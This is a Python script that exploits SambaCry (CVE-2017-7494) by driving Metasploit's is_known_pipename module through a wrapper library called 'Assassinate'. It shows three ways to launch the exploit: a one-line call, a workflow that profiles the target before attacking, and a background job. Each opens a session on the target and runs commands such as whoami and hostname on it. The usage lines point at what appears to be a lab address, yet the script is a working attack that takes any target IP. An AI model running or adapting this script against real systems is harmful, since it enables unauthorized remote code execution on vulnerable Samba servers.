#!/usr/bin/env python3
"""SambaCry (CVE-2017-7494) exploit using the high-level Assassinate API.

Demonstrates three exploitation approaches with increasing control.

Configuration:
    # Option 1: Environment variable
    export ASAS_METASPLOIT__ROOT=~/Projects/metasploit-framework

    # Option 2: Config file (~/.config/assassinate/config.yaml)
    # Option 3: Auto-detection (checks common paths)

Usage:
    # Run all methods (default)
    python sambacry_assassinate.py 172.19.0.3

    # Run specific methods
    python sambacry_assassinate.py 172.19.0.3 --quick
    python sambacry_assassinate.py 172.19.0.3 --contract
    python sambacry_assassinate.py 172.19.0.3 --job

    # Combine methods
    python sambacry_assassinate.py 172.19.0.3 --quick --contract
"""

import argparse
from assassinate import Hideout, Target


def demo_quick_hit(hideout, target_ip, share, user, password):
    """Quick hit - one-liner exploitation."""
    print("=" * 60)
    print("QUICK HIT - One-liner exploitation")
    print("=" * 60)

    kill = hideout.quick_hit(
        target=target_ip,
        weapon="exploit/linux/samba/is_known_pipename",
        options={
            "SMB_SHARE_NAME": share,
            "SMBUser": user,
            "SMBPass": password,
        },
    )

    if kill:
        print(f"[+] Session {kill.id}: {kill.interrogate('whoami').strip()}")
        kill.silence()
        return True
    return False


def demo_contract(hideout, target_ip, share, user, password):
    """Contract workflow - profiling and execution."""
    print("=" * 60)
    print("CONTRACT - Workflow with profiling")
    print("=" * 60)

    # Find weapon in arsenal
    weapons = hideout.arsenal.find("is_known_pipename", type="exploit")
    weapon = weapons[0]
    print(f"[*] Weapon: {weapon.name} (rank: {weapon.rank})")

    # Create target and contract
    target = Target(target_ip)
    contract = hideout.contract(target, weapon)
    contract.configure(SMB_SHARE_NAME=share, SMBUser=user, SMBPass=password)

    # Profile target
    print("[*] Profiling target...")
    if not contract.profile():
        print("[-] Target not vulnerable")
        return False

    print("[+] Target vulnerable!")

    # Execute
    kill = contract.execute()
    if kill:
        print(f"[+] Session {kill.id}")
        print(f"    User: {kill.interrogate('whoami').strip()}")
        print(f"    Host: {kill.interrogate('hostname').strip()}")
        kill.silence()
        return True
    return False


def demo_job(hideout, target_ip, share, user, password):
    """Background job - non-blocking execution."""
    print("=" * 60)
    print("JOB - Background execution")
    print("=" * 60)

    from msf import wait_for_new_session, job_kill

    # Arm weapon
    weapon = hideout.arm("exploit/linux/samba/is_known_pipename")
    weapon.options.RHOSTS = target_ip
    weapon.options.SMB_SHARE_NAME = share
    weapon.options.SMBUser = user
    weapon.options.SMBPass = password

    # Launch as background job
    job_id = weapon.exploit("cmd/unix/interact", job=True)
    print(f"[*] Job {job_id} launched")

    # Wait for session (GVL released)
    session = wait_for_new_session(timeout_ms=30000)
    if session:
        print(f"[+] Session {session.sid}: {session.run_cmd('whoami').strip()}")
        session.kill()
        return True

    job_kill(job_id)
    print("[-] No session")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="SambaCry exploit using the Assassinate API"
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--share", default="myshare", help="SMB share name")
    parser.add_argument("--user", default="root", help="SMB username")
    parser.add_argument("--pass", dest="password", default="root", help="SMB password")
    parser.add_argument("--quick", action="store_true", help="Run quick_hit demo")
    parser.add_argument("--contract", action="store_true", help="Run contract demo")
    parser.add_argument("--job", action="store_true", help="Run background job demo")
    args = parser.parse_args()

    # If no specific methods selected, run all
    run_all = not (args.quick or args.contract or args.job)

    with Hideout() as hideout:
        print(f"[*] Target: {args.target}\n")

        if args.quick or run_all:
            demo_quick_hit(hideout, args.target, args.share, args.user, args.password)
            print()

        if args.contract or run_all:
            demo_contract(hideout, args.target, args.share, args.user, args.password)
            print()

        if args.job or run_all:
            demo_job(hideout, args.target, args.share, args.user, args.password)
            print()

    print("=" * 60)
    print("COMPLETE")
    print("=" * 60)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
